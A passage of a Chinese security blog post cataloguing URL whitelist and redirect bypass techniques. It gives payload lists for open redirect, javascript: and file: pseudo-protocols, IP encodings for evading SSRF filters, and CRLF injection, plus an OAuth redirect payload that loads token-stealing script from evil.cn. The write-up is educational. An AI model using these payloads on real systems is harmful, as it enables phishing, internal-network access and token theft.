+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn\\www.mi1k7ea.com/urltest/index.jsp</span><br></pre></td></tr></table></figure>
+<p>在服务端使用getHost()函数解析获取Host，此时获取到的Host部分为<code>www.evil.cn\\www.mi1k7ea.com</code>，在如下校验中通过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"www.mi1k7ea.com"</span>.endsWith(<span class="string">"www.evil.cn\\www.mi1k7ea.com"</span>)</span><br></pre></td></tr></table></figure>
+<p>但是在浏览器侧，实际解析到的URL为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn/www.mi1k7ea.com/urltest/index.jsp</span><br></pre></td></tr></table></figure>
+<p>因此，成功绕过了校验。</p>
+<p><strong>CVE-2017-13176</strong></p>
+<p>同样是服务端和浏览器侧的认知不一致导致的。</p>
+<p>外部传入URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a:a@www.mi1k7ea.com:b@www.evil.cn/urltest/index.jsp</span><br></pre></td></tr></table></figure>
+<p>在服务端使用getHost()函数解析获取Host，此时获取到的Host部分为<code>www.mi1k7ea.com</code>，在如下校验中通过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"www.mi1k7ea.com"</span>.equal(<span class="string">"www.mi1k7ea.com"</span>)</span><br></pre></td></tr></table></figure>
+<p>但是在浏览器侧，实际解析到的URL为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.evil.cn/urltest/index.jsp</span><br></pre></td></tr></table></figure>
+<p>因此，成功绕过了校验。</p>
+<p><strong>不同浏览器认知不一致</strong></p>
+<p>对于外部传入URL：<code>https://www.evil.cn\www.mi1k7ea.com/urltest/index.jsp</code></p>
+<table>
+<thead>
+<tr>
+<th>浏览器内核</th>
+<th>代表产品</th>
+<th>解析出的Host部分</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Trident</td>
+<td>IE</td>
+<td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td>
+</tr>
+<tr>
+<td>Gecko</td>
+<td>Firefox</td>
+<td><a href="http://www.mi1k7ea.com">www.mi1k7ea.com</a></td>
+</tr>
+<tr>
+<td>WebKit</td>
+<td>Safari/Chrome</td>
+<td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td>
+</tr>
+<tr>
+<td>Presto</td>
+<td>Opera</td>
+<td><a href="http://www.evil.cn" target="_blank" rel="noopener">www.evil.cn</a></td>
+</tr>
+</tbody>
+</table>
+<p>注意：表格的结果和浏览器版本有关，具体的以实际返回结果为准。</p>
+<p>推荐使用BrowserStack模拟各个版本的浏览器。</p>
+<p>假设redirect_uri=auth.app.com.evil.com，绕过方式如下（能否成功与浏览器版本有关，以实际返回结果为准）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auth.app.com.evil.com</span><br><span class="line">evil.com?auth.app.com</span><br><span class="line">evil.com?@auth.app.com</span><br><span class="line">auth.app.com@evil.com</span><br><span class="line">auth.app.com\@evil.com</span><br><span class="line">evil.com\auth.app.com</span><br><span class="line">evil.com:\auth.app.com</span><br><span class="line">evil.com\.auth.app.com</span><br><span class="line">evil.com:\@auth.app.com</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-scheme校验绕过"><a href="#0x09-scheme校验绕过" class="headerlink" title="0x09 scheme校验绕过"></a>0x09 scheme校验绕过</h2><h3 id="“http-”与”-“之间"><a href="#“http-”与”-“之间" class="headerlink" title="“http:”与”//“之间"></a>“http:”与”//“之间</h3><p>在浏览器中，”http:”与”//“之间（包括在两个斜杠之间），是可以插入反斜杠<code>\</code>的，并不会影响对URL的请求。</p>
+<p>因此利用这个特性可以绕过一些针对Scheme的过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:\//www.evil.com</span><br><span class="line">http:\\\//www.evil.com</span><br><span class="line">http:/\/www.evil.com</span><br><span class="line">http:/\\\/www.evil.com</span><br><span class="line">/\/www.evil.com</span><br></pre></td></tr></table></figure>
+<p>上述URL最终在浏览器中都被解析为<code>http://www.evil.com</code>来访问。</p>
+<p><strong>Demo</strong></p>
+<p>比如，下面开发实现的通过识别scheme关键字来截取外部URL的Host代码中存在缺陷，可被绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">"https:www.evil.cn/?https://www.mi1k7ea.com/"</span>;</span><br><span class="line">        String url2 = url.substring(url.indexOf(<span class="string">"://"</span>) + <span class="number">3</span>);</span><br><span class="line">        String url3 = url2.substring(<span class="number">0</span>, url2.indexOf(<span class="string">"/"</span>));</span><br><span class="line">        System.out.println(url);</span><br><span class="line">        System.out.println(<span class="string">"最终解析得到的Host为："</span> + url3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/11.png" alt=""></p>
+<h3 id="大小写不统一"><a href="#大小写不统一" class="headerlink" title="大小写不统一"></a>大小写不统一</h3><p>在某些情况下，开发人员使用白名单校验URL或者scheme时，并未对传入的数据进行统一的大小写转换，此时就能通过大小写来绕过。</p>
+<h3 id="追加和替换"><a href="#追加和替换" class="headerlink" title="追加和替换"></a>追加和替换</h3><p>有时候，开发人员为了防止HTTP传输被劫持，会给传入的URL追加<code>https://</code>等。为了与服务端远程连接，会匹配自定义scheme来替换为HTTP协议。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>外部输入URL</th>
+<th>实际解析得到的URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>追加</td>
+<td>evil.cn://mi1k7ea.com/attack.html</td>
+<td><a href="https://evil.cn://mi1k7ea.com/attack.html" target="_blank" rel="noopener">https://evil.cn://mi1k7ea.com/attack.html</a></td>
+</tr>
+<tr>
+<td>替换</td>
+<td>imdb://evil.cn/attack.html</td>
+<td><a href="https://evil.cn/attack.html" target="_blank" rel="noopener">https://evil.cn/attack.html</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x0A-未校验scheme只校验Host部分"><a href="#0x0A-未校验scheme只校验Host部分" class="headerlink" title="0x0A 未校验scheme只校验Host部分"></a>0x0A 未校验scheme只校验Host部分</h2><p>一般的，在实现URL白名单校验时，使用getHost()获得域名部分后进行对比。但是如果没有校验URL中的协议部分（getScheme），则会存在伪协议绕过、HTTP劫持等问题。</p>
+<table>
+<thead>
+<tr>
+<th>注入的payload</th>
+<th>安全风险</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JavaScript://<a href="http://www.mi1k7ea.com/%0a%0dalert(0)//">www.mi1k7ea.com/%0a%0dalert(0)//</a></td>
+<td>XSS</td>
+</tr>
+<tr>
+<td>JavaScript://<a href="http://www.mi1k7ea.com/%0a%0dlocation=&#39;//www.evil.cn//&#39;//">www.mi1k7ea.com/%0a%0dlocation=&#39;//www.evil.cn//&#39;//</a></td>
+<td>任意URL跳转</td>
+</tr>
+<tr>
+<td>file://<a href="http://www.mi1k7ea.com//sdcard/evil.html">www.mi1k7ea.com//sdcard/evil.html</a></td>
+<td>注入本地恶意代码</td>
+</tr>
+<tr>
+<td><a href="http://www.mi1k7ea.com/H5_game.html">http://www.mi1k7ea.com/H5_game.html</a></td>
+<td>篡改返回报文</td>
+</tr>
+</tbody>
+</table>
+<p>如上特殊URL获取到的Host部分都是<code>www.mi1k7ea.com</code>，但实际在WebView或浏览器中加载时会有不同的行为。</p>
+<p><strong>Demo——JavaScript://</strong></p>
+<p>本示例可看出仅仅校验Host部分是不安全的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI evil_url = <span class="keyword">new</span> URI(<span class="string">"javascript://www.mi1k7ea.com/%0a%0dalert(0)//"</span>);</span><br><span class="line">        String whitelist = <span class="string">"www.mi1k7ea.com"</span>;</span><br><span class="line">        String host = evil_url.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host.endsWith(whitelist)) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Bypass URL WhiteList!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/13/URL-Bypass总结/12.png" alt=""></p>
+<h2 id="0x0B-file协议绕过"><a href="#0x0B-file协议绕过" class="headerlink" title="0x0B file协议绕过"></a>0x0B file协议绕过</h2><p>当产品要加载的是本地页面，但是对本地页面进行了白名单限制，此时可根据白名单实现逻辑来看情况绕过：</p>
+<table>
+<thead>
+<tr>
+<th>白名单校验实现伪代码</th>
+<th>外部传入的绕过payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>startsWith(“file:///data/data/com.mi1k7ea”)</td>
+<td>file:///data/data/com.mi1k7ea/../sdcard/evil.html</td>
+</tr>
+<tr>
+<td>startsWith(“file:///android_asset”)</td>
+<td>file:///android_assetevil/../sdcard/evil.html</td>
+</tr>
+<tr>
+<td>Uri.getHost().equals(“<a href="http://www.mi1k7ea.com&quot;">www.mi1k7ea.com&quot;</a>)</td>
+<td>file://<a href="http://www.mi1k7ea.com/sdcard/evil.html">www.mi1k7ea.com/sdcard/evil.html</a></td>
+</tr>
+<tr>
+<td>Uri.getHost().endsWith(“<a href="http://www.mi1k7ea.com&quot;">www.mi1k7ea.com&quot;</a>)</td>
+<td>file://<a href="http://www.mi1k7ea.com/sdcard/evil.html">www.mi1k7ea.com/sdcard/evil.html</a></td>
+</tr>
+<tr>
+<td></td>
+<td>file:/data/data/com.mi1k7ea/</td>
+</tr>
+<tr>
+<td></td>
+<td><code>file:/\\\\//data/data/com.mi1k7ea/</code></td>
+</tr>
+</tbody>
+</table>
+<p>如上特殊URL解析获取的Host部分均为<code>www.mi1k7ea.com</code>，但实际上在WebView或浏览器中加载时会有不同的行为。</p>
+<h2 id="0x0C-IP地址绕过"><a href="#0x0C-IP地址绕过" class="headerlink" title="0x0C IP地址绕过"></a>0x0C IP地址绕过</h2><h3 id="进制转换绕过"><a href="#进制转换绕过" class="headerlink" title="进制转换绕过"></a>进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p>
+<ul>
+<li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li>
+<li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+<li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li>
+</ul>
+<p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p>
+<ul>
+<li>8进制格式：0300.0250.0.1</li>
+<li>16进制格式：0xC0.0xA8.0.1</li>
+<li>16进制整数格式：0xC0A80001</li>
+<li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li>
+</ul>
+<p>其他特殊形式：</p>
+<ul>
+<li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li>
+<li>0.0.0.0可以直接访问到本地；</li>
+</ul>
+<h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p>
+<ul>
+<li>10.0.0.1.xip.io</li>
+<li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li>
+<li>mysite.10.0.0.1.xip.io</li>
+<li>foo.bar.10.0.0.1.xip.io</li>
+</ul>
+<h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote>
+<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p>
+</blockquote>
+<h2 id="0x0D-多重验证-amp-跳转绕过"><a href="#0x0D-多重验证-amp-跳转绕过" class="headerlink" title="0x0D 多重验证&amp;跳转绕过"></a>0x0D 多重验证&amp;跳转绕过</h2><p>除了直接跳转到目标网站外，还可以利用多重URL跳转达到访问目标站点的目的。</p>
+<p>比如存在URL为<code>http://www.mi1k7ea.com/redirect?url=xxx</code>，可以修改最后面的url来达到任意URL跳转，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mi1k7ea.com/redirect?url=http://login.mi1k7ea.com/abc?url=http://www.evil.cn</span><br></pre></td></tr></table></figure>
+<p>结合可信域的URL重定向，将url参数配置成一个重定向地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?client_id=24666666&amp;response_type=code&amp;state=XXXX&amp;scope=&amp;display=&amp;redirect_uri=http://auth.app.com/redirect.php?url=http://www.evil.cn</span><br></pre></td></tr></table></figure>
+<h2 id="0x0E-漏洞组合拳绕过"><a href="#0x0E-漏洞组合拳绕过" class="headerlink" title="0x0E 漏洞组合拳绕过"></a>0x0E 漏洞组合拳绕过</h2><p>通过漏洞组合拳也能进行绕过。</p>
+<h3 id="URL重定向-XSS"><a href="#URL重定向-XSS" class="headerlink" title="URL重定向+XSS"></a>URL重定向+XSS</h3><p>如下示例，可组合用于窃取token：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?client_id=24666666&amp;response_type=code&amp;state=XXXX&amp;scope=&amp;display=&amp;redirect_uri=http://app.com/ajax/cat.html?callback=&lt;script src=&quot;http://evil.cn/getToken.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="URL重定向-CRLF注入"><a href="#URL重定向-CRLF注入" class="headerlink" title="URL重定向+CRLF注入"></a>URL重定向+CRLF注入</h3><p>URL重定向通常是用过响应头中Location进行参数指定，当未对跳转参数做判断时，可能导致CRLF注入漏洞。</p>
+<p>比如，给用户CRLF注入一个session，可以造成会话固定攻击（当然，前提是网站本身存在会话固定漏洞）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=http://www.baidu.com/login%0d%0aSet-Cookie:JSESSID=hacked</span><br></pre></td></tr></table></figure>
+<p>也可以将恶意JS代码插入响应报文的body中，造成反射型XSS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=%0d%0a%0d%0a&lt;img src=x onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure>
+<p>此外，多数情况下浏览器Filter会缓解XSS即<code>X-XSS-Protection=1</code>，但是我们可以通过CRLF注入来设置响应头来关闭掉该浏览器的保护策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=%0d%0aX-XSS-Protection=0%0d%0a%0d%0a&lt;img src=x onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0F-一些特殊的URL"><a href="#0x0F-一些特殊的URL" class="headerlink" title="0x0F 一些特殊的URL"></a>0x0F 一些特殊的URL</h2><h3 id="待跳转地址是URL路径的一部分"><a href="#待跳转地址是URL路径的一部分" class="headerlink" title="待跳转地址是URL路径的一部分"></a>待跳转地址是URL路径的一部分</h3><p><strong>Demo1</strong></p>
+<p>比如<code>http://a.app.com</code>子域名存在一个形如<code>http://a.app.com/gate/jmp/域名</code>的跳转，但由于未对跳转的URL进行过滤，导致存在任意URL跳转漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.app.com/gate/jmp/www.evil.cn</span><br></pre></td></tr></table></figure>
+<p><strong>Demo2</strong></p>
+<p>比如，通过这个URL可跳转到任意站点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jp.rd.yahoo.com/SIG=af9o12ru/D=maps/Y=YAHOO/EXP=1288888888/*任意URL</span><br></pre></td></tr></table></figure>
+<p>钓鱼：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jp.rd.yahoo.com/SIG=af9o12ru/D=maps/Y=YAHOO/EXP=1288888888/*http://www.evil.cn</span><br></pre></td></tr></table></figure>
+<h3 id="通过富文本插入HTML代码进行跳转"><a href="#通过富文本插入HTML代码进行跳转" class="headerlink" title="通过富文本插入HTML代码进行跳转"></a>通过富文本插入HTML代码进行跳转</h3><p>很多网站都是有留言/评论功能的，并且支持切换到HTML格式。</p>
+<p>攻击者可以在留言的时候转换到HTML状态下插入<code>&lt;iframe src=&quot;&quot;&gt;&lt;/iframe&gt;</code>标签代码，在src属性中指定一个swf文件，比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://mi1k7ea.com/a.html"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">scrolling</span>=<span class="string">"yes"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中a.html代码为<code>&lt;embed src=&quot;a.swf&quot; width=100 height=100&gt;&lt;/embed&gt;</code>，从而完成一次URL跳转。</p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
